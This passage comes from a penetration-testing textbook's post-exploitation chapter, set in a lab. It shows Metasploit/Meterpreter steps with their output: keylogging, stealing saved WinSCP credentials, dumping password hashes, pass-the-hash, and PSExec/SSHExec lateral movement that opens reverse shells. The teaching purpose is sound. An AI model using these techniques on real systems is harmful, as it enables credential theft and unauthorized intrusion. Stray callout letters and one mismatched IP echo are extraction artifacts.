certainly useful information.
Now switch to Windows XP, and type something. In my example I typed
ctrl-R to open the Run dialog. Then I entered notepad.exe to start the
Notepad program and typed hi georgia into Notepad.
To see any keystrokes the keylogger has logged, enter keyscan_dump as
shown here. As you can see, all of the keystrokes I typed were logged.
meterpreter > keyscan_dump
Dumping captured keystrokes...
 notepad.exe  hi georgia 
To stop the keylogger, enter keyscan_stop in Meterpreter as shown here.
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
Gathering Credentials
In Chapter 9, we worked with password hashes from Windows, Linux, and
the FileZilla FTP server, but users may have other stored credentials on
their local system. Metasploit has several post modules for gathering pass-
words for specific software in /usr/share/metasploit-framework/modules/post/
windows/gather/credentials. For our example, we will look at stealing stored
credentials from WinSCP, a secure copy tool for Windows.
As shown in Figure 13-1, open WinSCP, set the File protocol to SCP, the
Host name to the IP address of the Ubuntu target, and the credentials to
georgia:password. Click Save As under the login information.
292 Chapter 13
Figure 13-1: Connecting with WinSCP
note Like some of the other tools used in this book, the WinSCP GUI may be updated in the
future, so your version may not look exactly like this.
You will be prompted for a session name, as shown in Figure 13-2. Check
the Save password box before clicking OK. Even WinSCP warns you that
saving passwords is a bad idea.
Figure 13-2: Saving credentials in WinSCP
Post Exploitation 293
Now switch back to Kali Linux, and use the module post/windows/gather/
credentials/winscp, as shown in Listing 13-19. Because this is a post module,
the only option you will need to supply is the ID of the Windows XP session.
msf > use post/windows/gather/credentials/winscp
msf post(winscp) > show options
Module options (post/windows/gather/credentials/winscp):
Name Current Setting Required Description
---- --------------- -------- -----------
SESSION yes The session to run this module on.
msf post(winscp) > set session 1
session => 1
msf post(winscp) > exploit
[*] Looking for WinSCP.ini file storage...
[*] WinSCP.ini file NOT found...
[*] Looking for Registry Storage...
[*] Host: 192.168.20.9 Port: 22 Protocol: SSH Username: georgia Password: password u
[*] Done!
[*] Post module execution completed
Listing 13-19: Stealing stored credentials from WinSCP
As shown in Listing 13-19, the module discovers our saved credentials u.
Based on the software your pentesting targets are running, there may be
other credential-gathering targets that will come in handy in the field.
net Commands
The Windows net command will allow us to view and edit network infor-
mation. Using various options, we can gain valuable information. Drop
to a Windows command shell using the Meterpreter command shell, as
shown here.
meterpreter > shell
--snip--
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
The command net users will show us all local users. Tacking on the
word /domain at the end of this and many net commands will show informa-
tion about the domain rather than the local system, but because our targets
are not joined to a domain, we’ll stick with net users.
C:\Windows\system32> net users
net users
User accounts for \\
------------------------------------------------------------------------------
Administrator georgia secret Guest
294 Chapter 13
We can also see the members of a group with the command net
localgroup group as shown in Listing 13-20.
C:\Windows\system32> net localgroup Administrators
net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the computer/domain
Members
-----------------------------------------------------------------------------------------------
Administrator
georgia
secret
The command completed successfully.
Listing 13-20: Viewing local administrators with net commands
To exit the shell and drop back into Meterpreter, type exit.
These are just a couple of examples of useful net commands. We’ll look
at using net commands to add a user later in this chapter.
Another Way In
In Chapter 5, we used Nmap to run a UDP scan. By definition, UDP scans
are not as exact as TCP scans. For example, port 69/UDP on the Windows XP
target, traditionally the port for TFTP, returned open|filtered in our UDP
Nmap scan. Because our scan did not receive any response, it was unclear if
anything was listening there at all. Short of fuzzing the TFTP server and pos-
sibly crashing it, it would be difficult to ascertain which TFTP software, if any,
is running. Now that we have access to the system, we can further investigate
running software for any vulnerabilities we may have missed.
note Earlier in the chapter we used the Meterpreter ps command to view all running pro-
cesses on the Windows XP target. One of these is 3CTftpSvc.exe, an older version
of the 3Com TFTP service that is subject to a buffer overflow condition in the TFTP
long transport mode. (We’ll write an exploit for this issue by hand in Chapter 19, but
there’s a Metasploit module for this issue as well.) Though it would be difficult for an
attacker to identify this issue remotely, the software is still vulnerable, and we should
include it in our pentest report.
It may be that you won’t discover a network-facing vulnerability until
after you have gained access to the system. Without sending random TFTP
input to the server and analyzing the results, it would be difficult for us to
find this issue.
Checking Bash History
One place to look for potentially interesting information on a Linux system
is in a user’s Bash history. When a Bash shell is closed, the commands that
have been executed are written to a file called .bash_history in the user’s
Post Exploitation 295
home directory. A perhaps rather contrived example where the user’s pass-
word is saved in plaintext in the Bash history file is shown here.
georgia@ubuntu:~$ cat .bash_history
my password is password
--snip--
Lateral movement
Once we have access to one system in a networked environment, can we use
it to access additional systems and their sensitive data? If our exploited sys-
tem is a member of a domain, we can certainly try to compromise a domain
account or ideally get domain administrator access so that we can log in to
and manage all systems in the domain.
But even if you can’t get control of a domain, you may still be able to
access the systems in that domain if they were all installed from the same
system install image with the same local administrator password that has
never been changed. If we can crack this password for one machine, we may
be able to log in to many machines in the environment without domain
access. Also, if a user has an account on multiple systems, he or she may
use the same password on each system, which might allow us to log in with
credentials we found elsewhere in the environment. (Good password poli-
cies help prevent these kinds of vulnerabilities, but passwords are often the
weakest link, even in high-security environments.)
Let’s look at a few techniques for turning access to one system into
access to many.
PSExec
The PSExec technique originated in the Sysinternals Windows manage-
ment tool set in the late 1990s. The utility worked by using valid credentials
to connect to the ADMIN$ share on the Windows XP SMB server. PSExec
uploads a Windows service executable to the ADMIN$ share and then con-
nects to the Windows Service Control Manager using remote procedure
call (RPC) to start the executable service. The service then sets up an SMB
named pipe to send commands and remotely control the target system.
The Metasploit module exploit/windows/smb/psexec implements a very
similar technique. The module requires a running SMB server on the tar-
get and credentials that give access to the ADMIN$ share.
In Chapter 9, we cracked the password hashes for users on our
Windows XP target. You can probably imagine using the found creden-
tials and PSExec to gain access to additional systems. Use the credentials
georgia:password with the PSExec module, as shown in Listing 13-21.
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > show options
Module options (exploit/windows/smb/psexec):
296 Chapter 13
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes Set the SMB service port
SHARE ADMIN$ yes The share to connect to, can be an admin share
(ADMIN$,C$,...) or a normal read/write folder share
SMBDomain WORKGROUP no The Windows domain to use for authentication
SMBPass no The password for the specified username
SMBUser no The username to authenticate as
msf exploit(psexec) > set RHOST 192.168.20.10
RHOST => 10.0.1.13
msf exploit(psexec) > set SMBUser georgiau
SMBUser => georgia
msf exploit(psexec) > set SMBPass passwordv
SMBPass => password
msf exploit(psexec) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Connecting to the server...
[*] Authenticating to 192.168.20.10:445|WORKGROUP as user 'georgia'...
[*] Uploading payload...
[*] Created \KoMknErc.exe...
--snip--
[*] Meterpreter session 6 opened (192.168.20.9:4444 -> 192.168.20.10:1173) at 2015-08-14
14:13:40 -0400
Listing 13-21: Using the PSExec module
In addition to RHOST, we need to tell the module which SMBDomain,
SMBUser, and SMBPass to use. Our Windows XP target is not a mem-
ber of a domain, so we can leave the SMBDomain option at the default,
WORKGROUP.
Set SMBUser to georgia u and SMBPass to password v, our discovered
credentials. Then run the exploit module. The module embeds the chosen
payload (in this case, the default windows/meterpreter/reverse_tcp) into a
Windows service image executable. After uploading the executable and con-
tacting Windows Service Control Manager, the service copies the shellcode
into executable memory for the service process and redirects execution to
the payload. Thus our payload runs and connects back to our Metasploit
listener on Kali. Even though we logged on as the user georgia, because our
payload is running as a system service, our session automatically has system
privileges.
note This is why we made the change to the Windows XP Security Policy in Chapter 1. If
Windows XP were a member of a domain, we could fill in the SMBDomain option
and use PSExec to get System access on any system where the domain user was a local
administrator. This is a great way to move around a network looking for interesting
information, additional password hashes, and more vulnerabilities.
Post Exploitation 297
Pass the Hash
Our previous attack relied on our ability to reverse the password hash and
gain access to the plaintext password for a user account. Of course, in the
case of our Windows XP target, this is trivial because it uses the entirely
crackable LM hashing algorithm.
In Chapter 9, we learned that when we have only the NTLM user
authentication hash of a password, instead of the weaker LM version, our
ability to reverse the hash in a reasonable amount of time depends on the
weakness of the password, the strength of our wordlist, and even the algo-
rithms employed by the password-cracking program. If we can’t reverse the
password hash, we’re going to have a tough time logging in to other systems
with the plaintext credentials.
PSExec comes to the rescue again. When a user logs in over SMB, his or
her password is not sent to the target in plaintext. Instead, the target system
issues a challenge that can be answered only by someone with the correct
password. In this case, the answer to the challenge is the LM- or NTLM-
hashed password, depending on the implementation.
When you log in to a remote system, your Windows application calls
a utility to hash the password, and that hash is sent to the remote system
for authentication. The remote system assumes that if you send the correct
hash, you must have access to the correct plaintext password—that is, after
all, one of the fundamentals of one-way hash functions. Can you think of a
scenario where you might have access to password hashes but not the plain-
text passwords?
In Chapter 9, we were able to reverse all password hashes on our target
systems. Additionally, on our Windows XP target, we were able to reverse
the LM hashes regardless of the strength of the password. But let’s simu-
late a situation where we have only password hashes, as shown with the
Meterpreter hashdump command in Listing 13-22.
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:93880b42019f250cd197b67718ac9a3d:86da9cefbdedaf62b66d9b2fe8816c1f:::
secret:1004:e52cac67419a9a22e1c7c53891cb0efa:9bff06fe611486579fb74037890fda96:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:6f552ba8b5c6198ba826d459344ceb14:::
Listing 13-22: Using hashdump
note When using the hashdump Meterpreter command against newer Windows operating
systems, you may find that it fails. An alternative is the post module: post/windows/
gather/hashdump. There is even post/windows/gather/smart_hashdump,
which can not only gather local hashes but also active directory hashes if you have
exploited a domain controller. So if at first you don’t succeed in dumping password
hashes on a pentest, explore additional options.
298 Chapter 13
Let’s use the Metasploit PSExec module to take advantage of how SMB
authenticates and a technique called Pass the Hash. Instead of setting the
SMBPass option to georgia’s password, copy in the LM and NTLM hashes for
georgia from the hashdump in Listing 13-23 as the SMBPass option.
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
--snip--
[*] Meterpreter session 7 opened (192.168.20.9:4444 -> 192.168.20.10:1233) at 2015-08-14 14:17:47
-0400
Listing 13-23: PSExec Pass the Hash
Again we’re able to use PSExec to get a Meterpreter session. Even
without knowing the plaintext password, the password hash alone can be
enough to get access to other systems in the environment using PSExec.
SSHExec
Like PSExec for Windows, we can use SSHExec to move through an envi-
ronment’s Linux systems if we have even one set of valid credentials, which
are likely to work elsewhere in the environment. The Metasploit module
multi/ssh/sshexec and its options are shown in Listing 13-24.
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) > show options
Module options (exploit/multi/ssh/sshexec):
Name Current Setting Required Description
---- --------------- -------- -----------
PASSWORD yes The password to authenticate with.
RHOST yes The target address
RPORT 22 yes The target port
USERNAME root yes The user to authenticate as.
--snip--
msf exploit(sshexec) > set RHOST 192.168.20.11
RHOST => 192.168.20.11
msf exploit(sshexec) > set USERNAME georgiau
USERNAME => georgia
msf exploit(sshexec) > set PASSWORD passwordv
PASSWORD => password
msf exploit(sshexec) > show payloads
--snip--
linux/x86/meterpreter/reverse_tcp normal Linux Meterpreter, Reverse TCP
Stager
--snip--